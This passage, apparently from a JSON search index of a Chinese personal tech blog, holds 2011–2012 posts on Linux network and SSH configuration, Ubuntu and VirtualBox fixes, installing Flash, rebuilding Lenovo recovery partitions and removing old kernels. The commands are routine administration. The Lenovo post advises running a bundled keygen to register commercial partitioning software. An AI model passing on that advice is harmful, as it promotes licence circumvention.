视频解码器安装同样的方法可以解决，其实其他软件也一样，视图方式无法继续时，转到终端安装往往能顺利完成。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"}]},{"title":"Linux命令行设置ip,DNS和gateway","slug":"set-ip-dns-gateway-in-terminal","date":"2012-05-24T14:01:20.000Z","updated":"2024-09-28T00:17:21.251Z","comments":true,"path":"set-ip-dns-gateway-in-terminal.html","permalink":"https://sobaigu.com/set-ip-dns-gateway-in-terminal.html","excerpt":"","text":"Ubuntu 12.04 LTS命令行设置IP及DNS设置方法点此进入 Ubuntu 版本命令行设置IP 12345678910111213141516171819cat /etc/network/interfaces# This file describes the network interfaces available on your system# and how to activate them. For more information, see interfaces(5).# The loopback network interfaceauto loiface lo inet loopback# The primary network interfaceauto eth0iface eth0 inet staticaddress 192.168.1.104netmask 255.255.255.0network 192.168.1.0broadcast 192.168.1.255gateway 192.168.1.2# dns-* options are implemented by the resolvconf package, if installeddns-nameservers 58.22.96.66 218.104.128.106 202.101.138.8dns-search .COM 重启网卡: /etc/init.d/networking restatr redhat Linux版本命令行设置IP 1ifconfig eth0 新ip 然后编辑/etc/sysconfig/network-scripts/ifcfg-eth0，修改ip 修改IP地址 1234567[aeolus@db network-scripts]$ vi ifcfg-eth0DEVICE=eth0ONBOOT=yesBOOTPROTO=staticIPADDR=219.136.241.211NETMASK=255.255.255.128GATEWAY=219.136.241.254 修改网关 1234vi /etc/sysconfig/networkNETWORKING=yesHOSTNAME=AaronGATEWAY=192.168.1.1 修改DNS 123[aeolus@db etc]$ vi resolv.confnameserver 202.96.128.68nameserver 219.136.241.206 重新启动网络配置 1/etc/init.d/network restart 例子 修改ip地址 即时生效:# ifconfig eth0 192.168.0.20 netmask 255.255.255.0 启动生效:修改/etc/sysconfig/network-scripts/ifcfg-eth0 修改&quot;default gateway&quot; 即时生效:# route add default gw 192.168.0.254 启动生效,修改:/etc/sysconfig/network-scripts/ifcfg-eth0 修改dns:/etc/resolv.conf,修改后可即时生效，启动同样有效 修改host name 即时生效:# hostname fc2 启动生效,修改:/etc/sysconfig/network 12345678ps:DEVICE=eth0BOOTPROTO=staticIPADDR=192.168.8.85NETMASK=255.255.248.0GATEWAY=192.168.8.1HWADDR=00:0uu3:47:2C:D5:40ONBOOT=yes 添加Linux系统启动项 1vi /etc/rc.d/rc.local 修改Linux系统SSH的端口号 操作系统Linux和Unix都适用： 修改配置文件 /etc/ssh/sshd_config，将里面的Port改为新端口（此端口必须是没有程序用到），比如10022， 然后 kill -HUP 'cat /var/run/sshd.pid' 就行了。 注：现有连接自己不会断，因为kill -HUP cat /var/run/sshd.pid 只是HUP监听的那个，已经建立的连接（不同的 pid）不会断。 要想重新启用并用新端口登陆 ，此时可以在本登陆帐户下 用 exit 命令退出，在用新的端口登陆即可！","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"VirtualBox 4.1.14 for Windows导致win7x64本地连接无响应或红叉","slug":"virtualbox-4-1-14-for-windows-no-response","date":"2012-05-10T13:53:43.000Z","updated":"2024-09-28T00:17:21.252Z","comments":true,"path":"virtualbox-4-1-14-for-windows-no-response.html","permalink":"https://sobaigu.com/virtualbox-4-1-14-for-windows-no-response.html","excerpt":"VirtualBox一直是我比较喜欢的软件,相比vmware轻便简单,虽然有些地方如文件传递等不如vmware,但其资源耗用,启动速度等都比较好,也兼容vmware的虚拟机文件,所以一直在用,每逢提示更新都第一时间更新. 前几天VirtualBox又提示更新了,还是老规矩第一时间下载了,一直没装.有天有空,就正好装了,装完关机.","text":"VirtualBox一直是我比较喜欢的软件,相比vmware轻便简单,虽然有些地方如文件传递等不如vmware,但其资源耗用,启动速度等都比较好,也兼容vmware的虚拟机文件,所以一直在用,每逢提示更新都第一时间更新. 前几天VirtualBox又提示更新了,还是老规矩第一时间下载了,一直没装.有天有空,就正好装了,装完关机. 再开机时感觉机器很卡,右下角的网络连接图标一直有个等待图标在滚动,而网络却是通的,最后可能会出现连接上一二大红叉,但网络还是正常的.cpu占用比较高.如右图,注意看system进程,这个进程占用这么多cpu是机器卡的原因. 也没想是装了VirtualBox导致的,总以为中毒…看来看去没什么异常,用procmon可以监控到有个svchost.exe一直在刷注册表,usb设备及网络设备相关,而这个进程文件也是正常的.这个时候点击本地连接没反应,通知区域其他图标右键没反应,无法打开连接管理页面…总之一个卡. 想起异常前更新过virtualbox,索性就卸载尝试,但此时无法打开控制面板中卸载软件页,运行Windows7manager等软件一般都是在初始化,即便是进到了软件卸载页,调用的Windows installer程序也是无法初始化成功的,所以如果你遇到了不用苦苦等待了,下面是我的简单方法: 打开drivers目录,将VBox*打头的驱动文件删除或改名,然后重启机器. 重启回来就会发现万事大吉了,ok,卸载吧.如果需要用到virtualbox,找4.1.12装吧,之前那个版本是没有问题的.","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"Ubuntu 12.04 LTS试用笔记","slug":"ubuntu-12-04-lts-beta","date":"2012-04-13T16:45:52.000Z","updated":"2024-09-28T00:17:21.251Z","comments":true,"path":"ubuntu-12-04-lts-beta.html","permalink":"https://sobaigu.com/ubuntu-12-04-lts-beta.html","excerpt":"帮老婆重新捣鼓笔记本系统,想想Windows老是中毒,应该装个Linux,Windows有问题的时候拿来应急也好. 心血来潮,下了最新版本的Ubuntu 12.04 LTS beta1… Ubuntu本来挺熟的,装完界面也挺熟的,可问题接踵而来…","text":"帮老婆重新捣鼓笔记本系统,想想Windows老是中毒,应该装个Linux,Windows有问题的时候拿来应急也好. 心血来潮,下了最新版本的Ubuntu 12.04 LTS beta1… Ubuntu本来挺熟的,装完界面也挺熟的,可问题接踵而来… 首先装完无线网卡无法识别,说缺少无线固件 wireless firmware missing… 还没等你有功夫处理这事,unity自己开始报错了… 程序异常退出,界面无响应,各种提示会在桌面上提示,好心给report一把,收集半天,最后会告诉你无法上报… 本想这beta1发布有段时间了,莫非有更新可以修复? 满怀希望更新了400来M,装的过程中就会有各种报错,最后unity界面无法进入,用unity --reset都不好使… 总之,这个版本很不成熟,本来就怀念gnome时期,干脆,咱转投fedora吧,熟悉下其他的发行版也好. 规劝大家,现在的Ubuntu还是别装了吧.伤不起,再见了,Ubuntu,至少是暂时再见… 2012年5月1日 还好,Ubuntu 12.04 LTS release版本感觉还可以,报错问题解决,看来beta版本还是不能乱装,否则会影响体验下去的兴趣.给别人电脑上装的mint感觉也不错,只是越来越像Windows了,Ubuntu也一样.","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"}]},{"title":"隐藏Windows右下角即插即用图标","slug":"hide-windows-plug-flag","date":"2012-03-10T13:08:20.000Z","updated":"2024-09-28T00:17:21.251Z","comments":true,"path":"hide-windows-plug-flag.html","permalink":"https://sobaigu.com/hide-windows-plug-flag.html","excerpt":"","text":"Windows系统在识别存储介质时会自动区分即插即用设备还是IDE设备。当我们在电脑上插入移动硬盘或者u盘时，系统会自动在右下角任务栏显示一个绿色的箭头图标，即即插即用标识。 而在某些笔记本上，系统装完无线网卡设置是硬盘都识别为即插即用设备。 虽然没什么大的影响，但我们在用移动设备时，点击弹出设备列表会比较长，有时候也会点错。况且，稍有洁癖的人会觉得那个图标碍眼，硬盘或者无线网卡本来就不应该在那个图标下管理，这其实是厂商提供的驱动没有处理好，没有正确识别。知道为什么，那么我们就可以到对应官网去下载此驱动安装即可。 对应驱动名称一般为“USB 2.0 Docking Station Drivers”，以垃圾惠普电脑为例，用此关键词可以找到个编号为sp48710的驱动包，装上后就可以解决系统将硬盘和无线网卡识别为即插即用的问题了。 或者可以耐心点，到对应操作系统及机器型号下将所有驱动找一遍看是否有，没有的话下载一个惠普电脑用的该驱动安装尝试也无妨。 另外,关于惠普无线网卡这玩意儿,实在是纠结.惠普不像联想一样,提供个fn+?控制无线开关,而要拨按钮.当然，装双系统时你最好还是通过拨弄开关来实现启用或关闭，因为一个系统关了后，切换到另外一个系统将找不到这关设备，至今还没明白为什么.在Windows系统下,惠普提供了一个连接管理程序,可以实现软件开关无线.有时候你装Linux系统,比如Linuxmint,4416s会由于缺少固件驱动,会把无线网卡禁用,这样切到Windows系统也会被禁用,这个时候你就用hp connection manager打开吧,别以为无线网卡坏了.O(∩_∩)O~ 最后一句，惠普这个牌子，大家还是别尝试了，谁买谁后悔！","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"Ubuntu11.10之后版本英文locate下gedit汉字乱码问题解决办法","slug":"ubuntu11-10-gedit","date":"2012-03-08T14:37:41.000Z","updated":"2024-09-28T00:17:21.251Z","comments":true,"path":"ubuntu11-10-gedit.html","permalink":"https://sobaigu.com/ubuntu11-10-gedit.html","excerpt":"之前用的Ubuntu一直是从较早安装的版本升级上来的，所以没在意到gedit乱码问题的设置已经改变。 11.10下默认已经没有安装gconf-editor，即便是安装了也看不到以前的apps&gt;gedit2分支。 原来gedit已经升级到3，且Ubuntu的设置工具也已经改变，当前使用为dconf-editor，需要安装的是dconf-tools。 你没看错，是d打头！","text":"之前用的Ubuntu一直是从较早安装的版本升级上来的，所以没在意到gedit乱码问题的设置已经改变。 11.10下默认已经没有安装gconf-editor，即便是安装了也看不到以前的apps&gt;gedit2分支。 原来gedit已经升级到3，且Ubuntu的设置工具也已经改变，当前使用为dconf-editor，需要安装的是dconf-tools。 你没看错，是d打头！ 知道是什么工具就好办了，ctrl+alt+t调出终端，输入： 1sudo apt-get install dconf-tools 安装完成后控制板输入dconf就应该可以找到dconf-editor，或者命令行直接输入都可以，在以下路径找到修改设置处： org&gt;gnome&gt;gedit&gt;preferences&gt;encodings:autodetected 单击value列，按已有的格式，在最面添加GB18030，以英文逗号分割，输入完成后按回车，关闭配置编辑器，再次打开带汉字的文本文件，汉字应该可以显示了。 [‘GB18030’, ‘UTF-8’, ‘CURRENT’, ‘ISO-8859-15’, ‘UTF-16’] 早前版本Ubuntu解决汉字乱码问题方法请见: 英文locale下gedit打开中文文档乱码及中文输入法解决办法 Ubuntu系统显示环境设置可见:Ubuntu中英文locale设置 官方wiki：http://wiki.Ubuntu.org.cn/Gedit%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"}]},{"title":"代码高亮工具-Windows篇","slug":"highlight-tool-in-windows","date":"2012-03-07T15:30:24.000Z","updated":"2024-09-28T00:17:21.251Z","comments":true,"path":"highlight-tool-in-windows.html","permalink":"https://sobaigu.com/highlight-tool-in-windows.html","excerpt":"文章中如果插入代码,我们希望其能醒目,或者按一定的格式显示,即代码高亮. 文章中插入代码方法大致有两种: 代码模式插入高亮代码; 使用代码高亮插件;","text":"文章中如果插入代码,我们希望其能醒目,或者按一定的格式显示,即代码高亮. 文章中插入代码方法大致有两种: 代码模式插入高亮代码; 使用代码高亮插件; 我们可以通过代码高亮插件,如&quot;Syntax Highlighter Optimized&quot;之类插实现,用起来也比较方便,但当此类插件禁用,当时用插件插入的&lt;pre&gt;代码将不会起到高亮插件的作用,而且势必会留下后遗症. 另一种方法便是直接在编辑文章时插入完整的高亮代码. wp自带的&lt;code&gt;默认只是区分显示,并不会很明显,效果并不理想. 在此推荐一款小工具,CodeRenderUnmi(自行去搜索下载),将我们需要高亮的内容贴到source code中,选择希望用那种语言格式,render一把,把生成好的html code复制,编辑文章切换到html方式,粘贴保存即可. 如果你是在Linux系统下进行创作，则此工具无法满足需求，请移步：代码高亮工具-Linux篇","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"}]},{"title":"巧用qq临时会话","slug":"qq-session-codes","date":"2012-03-05T15:18:09.000Z","updated":"2024-09-28T00:17:21.251Z","comments":true,"path":"qq-session-codes.html","permalink":"https://sobaigu.com/qq-session-codes.html","excerpt":"很多时候我们需要跟陌生人聊天，又不想加对方为好友，这就用到了QQ临时会话. 如果是在一个群里或者讨论组里，那么临时会话很简单，但往往我们要临时交流的对象是网上搜索的一个QQ.此时，我们就有发起临时会话的必要了.","text":"很多时候我们需要跟陌生人聊天，又不想加对方为好友，这就用到了QQ临时会话. 如果是在一个群里或者讨论组里，那么临时会话很简单，但往往我们要临时交流的对象是网上搜索的一个QQ.此时，我们就有发起临时会话的必要了. 我们经常会发现某个网站有QQ客服，浏览器中点击网页上的QQ客服图标，然后会自动调用QQ程序发起对话.如果是登陆了多个QQ，则提供选择哪个QQ聊天，选完就可以与其进行交流，又不至于需要加为好友，一般出现的url地址如: 1http://sighttp.qq.com/msgrd?v=3&amp;amp;uin=666666&amp;site=sobaigu.com&amp;menu=yes 我们看到地址栏跳转到这样的地址就可以跟QQ号为 666666 的聊天，那么我们就可以变通，将此号码替换成任何我们想要跟其聊天的对象. 早前腾讯还专门开发了个协议，地址栏输入 tencent:// 就会调用QQ程序，一样的在浏览器地址栏输入如下就可以与任意号码聊天: 1tencent://message/?uin=666666&amp;Site=sobaigu.com&amp;Menu=yes 以上说的都是基于浏览器地址栏，而且在具有地址栏搜索功能的浏览器上，tencent:// 协议是无法被浏览器识别的，就会当作字符串进行搜索.","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"64位Ubuntu安装flash控件","slug":"install-flash-on-linux-64bit","date":"2012-02-16T15:50:02.000Z","updated":"2024-09-28T00:17:21.251Z","comments":true,"path":"install-flash-on-linux-64bit.html","permalink":"https://sobaigu.com/install-flash-on-linux-64bit.html","excerpt":"今天重装了我的Ubuntu系统，从10.10升级到11.04，开始有点不习惯，不过稍微用下感觉还好。顺便把firefox卸载了，装了个chromium，这个可以在软件源里搜索得到。 ps：其实以前我所firefox迷，后来chrome出来了，:-)，怪不得俺，俺喜欢chrome的简洁，chrome又同样具有强大的扩展支持，完全能取代了，全线转移到google浏览器阵营。","text":"今天重装了我的Ubuntu系统，从10.10升级到11.04，开始有点不习惯，不过稍微用下感觉还好。顺便把firefox卸载了，装了个chromium，这个可以在软件源里搜索得到。 ps：其实以前我所firefox迷，后来chrome出来了，:-)，怪不得俺，俺喜欢chrome的简洁，chrome又同样具有强大的扩展支持，完全能取代了，全线转移到google浏览器阵营。 安装完成chrome后便是把该装的装上啦。扩展不用单个安装，google帐号已经自动备份了，只要点右边那扳手》preferences》personal stuff》登录自己的gmail邮箱就好了，当然，前提是你以前用过（我在Windows下用的），现在天朝访问国外网站比较慢，耐心等待，longlong time 过去后会提示要同步哪些内容，都选就对了。 又是卡死一会儿，当弹出一排标签的时候表明同步完成，你的那些扩展自动安装好了，当然，别想你那些扩展的设置能如愿同步。 我一直在用的扩展有： ChinaWeather and Lunar Calendar Docs PDF/PowerPoint Viewer (by Google) AdBlock AutoPager Chrome FlashBlock Google Dictionary Mail Checker Plus for Google Mail™ Mouse Stroke（这个在Ubuntu下无法使用，但不能删除，否则会自动同步到账户，Windows下是很好用的） OnlineDict RSS Subscription Extension (by Google) Skip Redirector Speed Dial TabJump - Intelligent Tab Navigator Ultimate Chrome Flag Yet Another Drag and Go 迅雷、快车、旋风专用链自动破解，好像用的不少，功能都很强大，改天有空可以写个文章推介下，o(∩∩)o…哈哈。 剩下的就是安装flash播放控件了，Ubuntu下没Windows下那么方便，稍微复杂点，但也不是很难。可以直接登录adobe.com去下载，或者干脆直接访问ku6或土豆，随便点个视频，应该会提示你缺失播放控件了，点立即安装，点完会引导你一步步往下，自己按提示去找就好了，这里我把最终下载地址直接贴出来，下载页面应该是这个最终文件的下载地址： http://download.macromedia.com/pub/labs/flashplayer10/flashplayer10_2_p3_64bit_Linux_111710.tar.gz 点击或者复制此下载地址，将下载到目前为止最新版本的文件，默认会保存到～/Download下，下载完成后用tar命令解压将得到libflashplayer.so文件，用sudo mv将其复制到/usr/lib/mozilla/plugins$，然后 1expired@expired:~/Downloads$ sudo mv libflashplayer.so /usr/lib/mozilla/plugins/ 关闭当前浏览器，重启程序，再访问视频网站，ok，itis done！ 新版本的flash已经把32位和64位版本合在一起了，所以下载会得到install_flash_player_11_Linux_x86_64.tar.gz，本次更新还涉及到其他一些文件，可以看压缩包里的readme.txt,使用方法是一样的，只是需要多复制一些文件： sudo cp -r usr/* /usr 新版本包里附带的说明如下： xxx@expired:~/Downloads$ cat readme.txt Adobe Systems Incorporated Flash Player 11 for Linux Version 11.2.202.243 2012 Adobe recommends that all users upgrade to the latest version of Adobe Flash Player for the most recent features, bug fixes, and security fixes. For more information on the new features in Flash Player 9, please visit http://www.adobe.com/products/flashplayer/. For more information on system requirements, fixed issues, and known issues, see the release notes at http://www.adobe.com/go/flashplayer_releasenotes. o Unpack the tar.gz file. Once unpacked you will see the following: libflashplayer.so /usr o Identify the location of the browser plugins directory, based on your Linux distribution and Firefox version o Copy libflashplayer.so to the appropriate browser plugins directory. At the prompt type: cp libflashlayer.so o Copy the Flash Player Local Settings configurations files to the /usr directory. At the prompt type: sudo cp -r usr/* /usr","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"},{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"联想一键恢复,升级WIN7，联想一键恢复/工厂备份自己制作","slug":"win7-lenovo-onekeyrecovery-manufacturer","date":"2011-11-23T15:48:31.000Z","updated":"2024-09-28T00:17:21.251Z","comments":true,"path":"win7-lenovo-onekeyrecovery-manufacturer.html","permalink":"https://sobaigu.com/win7-lenovo-onekeyrecovery-manufacturer.html","excerpt":"","text":"好多人认为装上系统，再装上联想的一键恢复软件就可以了，但是，你要知道，这是你的电脑备份是可以 的，但是所谓的开机系统恢复（没有破坏隐藏分区的话，正常情况下还是可以的），工厂备份恢复（工厂备份：也就是你的隐藏分区里的备份文件）都是不可以的。 你的这时的工厂备份还是原来的！ 要完全做一个现在的系统一键恢复，我们就要自己动手了，因为要送到联想客服做系统+一键恢复的话，联想工程师只能给你做机子的原配系统和其备份了（简单的说，你的联想机子买的时候是Vista的，只能给你做Vista的了，而且是绝对不会把制作软件以及制作方法告诉你的）。求人不如求己，我们自己动手DIY联想一键恢复。 工欲善其事，必先利其器。准备我们需要的软件： 1.联想一键恢复7.0工程师可修复安装版 迅雷下载全新安装版 2.U盘/刻录盘 3.启动盘制作工具：UltraISO 4.硬盘分区工具：Acronis Disk Director Suite10.1 将以上工具下载好就差不多可以开工了。 第一步：制作启动盘 我们可以制作开机启动光盘或U盘，方法就不全介绍，到底是用U盘还是光盘，这个要看个人需要了。 1、启动光盘制作，光盘简单，直接用光盘工具将OKR7.ISO镜像写入到光盘就好了， 推荐软件Nero、UltraISO软碟通，简单就不详细介绍了，UltraISO软碟通（最新版附带注册码:网盘下载）制作方法参照以下，OKR7.ISO文件超过了700M，CD盘制作不了，本人没有用此方法，制作好了那个盘也就浪费了。 2、 启 动U盘，推荐使用的方法，找一个空间足够的U盘【注意了，用之前先把U盘里面的重要的东西拷出来，因为在制作的过程中要格盘的】 下载软件UltraISO软碟通，找到你电脑的OKR7文件打开，菜单上点启动&gt;写入硬盘映像 [caption id=“” align=“alignleft” width=“325”] 图1、打开一键还原iso[/caption] [caption id=“” align=“alignright” width=“325”] 图2、写入启动盘[/caption] 建议写入MBR，即点击便捷启动》写入启动mbr，一般选USB-HDD即可，完成后按写入，提示数据将丢失，点击“是”就开始制作启动U盘了，一般几分钟就搞定了。 启动盘制作好了，接下来就需要给接下来的一键还原腾出空间了。 第二步：擦除老的一键还原 如果之前出厂已经有一键还原，那么我们需要擦除老的一键还原，即对空间重新划分、指定驱动器号及卷标。当然，如果之前就没有隐藏分区的就只需要重新划分空间就可以了。对于以前有隐藏分区的机油们，需要将隐藏分区删去，但是又出现了一个问题，在Windows系统的磁盘管理工具中不可以删除隐藏分区，这就要借助软件来执行了，软件有PM（xp系统），Acronis Disk Director Suite10.1（适用Vista，win7）是做得最好的，特点是：功能强大(分割、合并、增加、减少)容易上手，划分快捷，对现有文件无损。 [caption id=“” align=“alignleft” width=“325”] 图3.Windows系统自带分区工具无法更改隐藏分区[/caption] [caption id=“” align=“alignright” width=“325”] 图4.ADD以手动方式启动[/caption] Acronis Disk Director Suite，这个软件现在已经有了汉化版本，考虑到有的人下的英文原版，就用英文原版介绍给大家，也推荐用引文版，汉化版本据说有问题。 安装步骤就不多说了，普通软件的安装方法，下载包中有注册机，安装的时候运行算号就可以了。安装完成后选manual mode方式启动软件。 ADD是个强大的分区工具，在已有分区上右键将出现你所需要的所有操作，如果是调整分区，则可选择resize，此处我需要删除分区，那么在原先的隐藏分区上右键删除分区。 [caption id=“” align=“alignleft” width=“325”] 图5.add中删除原一键还原分区[/caption] [caption id=“” align=“alignright” width=“325”] 图6.add中删除原一键还原分区成功[/caption] [caption id=“” align=“alignleft” width=“325”] 图7.按add要求重启[/caption] [caption id=“” align=“alignright” width=“325”] 图8、开机按提示进入选择启动顺序，选择从U盘启动[/caption] 第三步：安装一键还原 [caption id=“” align=“alignright” width=“325”] 图9.选择安装模式【千万别选错了】[/caption] 在此提醒： 安装一键还原本身没什么，但一旦出错，将对你电脑里的数据造成致命的危害，所以对于粗心的操作来说，这是个比较危险的过程。为了你多年的收藏以及绝版的日本爱情动作片能顺利给你儿子继承，建议你用移动硬盘备份好，这里强调另外一块硬盘，当灾难发生时，也许是你整块硬盘遭受灭顶之灾，切记！ 进入U盘启动后将会出现提示选择安装模式： 1.全新安装-擦除已有分区 2.修复安装-不擦除分区 这里解释下： “1”：全新安装。此模式会清空硬盘上原有的所有分区，并根据脚本定义对硬盘重新分区、格式化等操作。 使用全新 安装模式安装OKR7时，磁盘分区脚本对硬盘进行分区的模式为： C盘：根据手动输入的分区大小划分， NTFS，主分区，卷标为默认。 D盘：根据脚本定义自动划分，容量为磁盘总容量－15G－C盘容量，文件格式为NTFS,扩展+逻辑分区，卷标为默认。 O盘（即隐藏分区）：约15G（我的是13.7G），NTFS，主分区，卷标为LENOVO_PART 假如你所新电脑，没有隐藏分区，想完全给电脑一个全新面貌的，就可以采用全新安装模式。在进行全新安装时，安装程序会弹出对话框，要求输入C盘大小，单位以MB计算；并根据所 输入的C盘容量及整个硬盘的容量来自动进行D盘和O盘的建立。 再次提醒各位，选1全新安装程序会清除原硬盘上的所有数据，其中包括全部的系统数据及用户数据，并会按照预定参数在硬盘上建立分区（C、D、O）。 按照程序提示进行安装模式，我选择2，弹出选择语言，21为简体中文，22为繁体中文，其他的自己翻译，咱选21. [caption id=“” align=“alignleft” width=“325”] 图10.选择语言[/caption] [caption id=“” align=“alignright” width=“325”] 图11、安装过程[/caption] 等一会就会出现上面的界面啊，然后出现Press any key to continue，点任意键，之后就关机了。此时你的一键恢复工程师版就装好了。 FAQ: Q：OKR 7.0系统不能进行工厂备份，提示”No service partiton”？ A：遇到此情况时，请检查O盘是否已做隐藏处理！ Q：OKR 7.0系统不能进行工厂备份，提示”Find os partiton fail”？ A：遇到此情况时，请检查C是否已完成OS安 装！如OS已成功安装，可尝试运行以下命令行：BCDBOOT C:Windows /L {language}（language:当前系统所使用的语言，如：zh-cn）后重新进行工厂备份！ Q：按 进入OKR 7.0系统时不能调用OKR 7.0主界面，而直接进入WIN PE命令行模式？ A：遇到此情况时，请检查O盘卷标是否 为”LENOVO_PART”！ Q: 部分机型出厂仅安装了FREEDOS，用户会自行安装或选择委托维修站安装其它操作系统， 这时还可以 将安装好的操作系统进行工厂备份吗？ A：根据工厂定义，预装FREEDOS的机型，OKR7所在分区仅为1G左右。这样不能满 足Windows系统的备份要 求，所以如果想要备份就必须重新划分隐藏空间。建议与确认数据不重要后，选择全新安装OKR7，并重 新安装 或布署操作系统并备份！ 地 址在下面： http://kbdl.lenovo.com.cn/Laptop/Leos_Onkey/OKR7.ISO（此版本不可修复安装，不建议使用）","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"Ubuntu下boot分区空间不足解决办法","slug":"ubuntu-boot-no-space","date":"2011-01-27T15:51:15.000Z","updated":"2024-09-28T00:17:21.251Z","comments":true,"path":"ubuntu-boot-no-space.html","permalink":"https://sobaigu.com/ubuntu-boot-no-space.html","excerpt":"很多同学都是在自己的机器上安装双系统，也就是说用来装Linux的空间不会很多。在装的过程中都喜欢把boot挂单独挂分区，一般设置100M， 可随着Linux升级，往往会攒下好几个内核，某一天系统会提示你升级失败，空间不足了。。。 更改boot分区大大小不晓得可不可以做到，貌似Linux下还没有无损分区的概念。 既然已经知道是boot空间不足了，那首先我们看看里面都有神马东西！！","text":"很多同学都是在自己的机器上安装双系统，也就是说用来装Linux的空间不会很多。在装的过程中都喜欢把boot挂单独挂分区，一般设置100M， 可随着Linux升级，往往会攒下好几个内核，某一天系统会提示你升级失败，空间不足了。。。 更改boot分区大大小不晓得可不可以做到，貌似Linux下还没有无损分区的概念。 既然已经知道是boot空间不足了，那首先我们看看里面都有神马东西！！ 123456789101112expired@expired:~$ ls /bootabi-2.6.35-25-generic memtest86+.binabi-2.6.35-27-generic memtest86+_multiboot.binabi-2.6.35-28-generic System.map-2.6.35-25-genericconfig-2.6.35-25-generic System.map-2.6.35-27-genericconfig-2.6.35-27-generic System.map-2.6.35-28-genericconfig-2.6.35-28-generic vmcoreinfo-2.6.35-25-genericgrub vmcoreinfo-2.6.35-27-genericinitrd.img-2.6.35-25-generic vmcoreinfo-2.6.35-28-genericinitrd.img-2.6.35-27-generic vmlinuz-2.6.35-25-genericinitrd.img-2.6.35-28-generic vmlinuz-2.6.35-27-genericlost+found vmlinuz-2.6.35-28-generic 我们可以看到都是一些内核启动文件，很明显有些是我们不需要的，其实以上都还是我已经卸载了俩比较老的内核的情况了，没商量，不需要的就当垃圾处理掉。 首先请用uname -a看下自己当前启动的是哪个内核。 12expired@expired:~$ uname -aLinux expired 2.6.35-28-generic #49-Ubuntu SMP Tue Mar 1 14:39:03 UTC 2011 x86_64 GNU/Linux 从中可以看到我此刻启动的是2.6.35-28-generic，再用dpkg命令看下你的机器上都有哪些内核文件。 1234567expired@expired:~$ dpkg --get-selections |grep Linux-imageLinux-image-2.6.35-22-generic deinstallLinux-image-2.6.35-24-generic deinstallLinux-image-2.6.35-25-generic installLinux-image-2.6.35-27-generic installLinux-image-2.6.35-28-generic installLinux-image-generic install 不少，理论上除正在用的都可以删除，但刚升级的东西可能不稳定，为保险起见，保留1-2个之前版本吧。 运行apt-get remove命令卸载不需要的内核。 123456expired@expired:~$ sudo apt-get remove Linux-image-2.6.35-25-genericThe following packages will be REMOVED:Linux-image-2.6.35-25-generic0 upgraded, 0 newly installed, 1 to remove and 0 not upgraded.After this operation, 139MB disk space will be freed.Do you want to continue [Y/n]? y 出现以上提示问是否继续，按y或者直接回车继续。完成后会有如下提示： 12345678910111213DKMS: uninstall Completed.Examining /etc/kernel/postrm.d .run-parts: executing /etc/kernel/postrm.d/initramfs-tools 2.6.35-25-generic /boot/vmlinuz-2.6.35-25-genericrun-parts: executing /etc/kernel/postrm.d/zz-update-grub 2.6.35-25-generic /boot/vmlinuz-2.6.35-25-genericGenerating grub.cfg ...Found Linux image: /boot/vmlinuz-2.6.35-28-genericFound initrd image: /boot/initrd.img-2.6.35-28-genericFound Linux image: /boot/vmlinuz-2.6.35-27-genericFound initrd image: /boot/initrd.img-2.6.35-27-genericFound memtest86+ image: /memtest86+.binFound Windows 7 (loader) on /dev/sda1Found Windows Vista (loader) on /dev/sda4done 现在的Ubuntu会自动重建启动菜单grub.cfg，所以就一步到位了。卸载完后可以用df命令看下boot分区的空间使用情况。 1234expired@expired:~$ dfFilesystem 1K-blocks Used Available Use% Mounted on/dev/sda9 19223252 9429624 8817144 52% //dev/sda7 93207 53279 35116 61% /boot ok，已经腾出35m空间了，现在可以运行sudo apt-get upgrade升级了。再用dpkg看下还剩什么东西。 123456expired@expired:~$ dpkg --get-selections | grep Linux-imageLinux-image-2.6.35-25-generic deinstallLinux-image-2.6.35-27-generic installLinux-image-2.6.35-28-generic installLinux-image-generic installLinux-image-2.6.35-25-generic 显示deinstall，表示已经删除，也许你觉得留着这个也不好看，那就试试下面的命令： 1234567expired@expired:~$sudo dpkg -P Linux-image-2.6.35-25-generic(Reading database ... 286964 files and directories currently 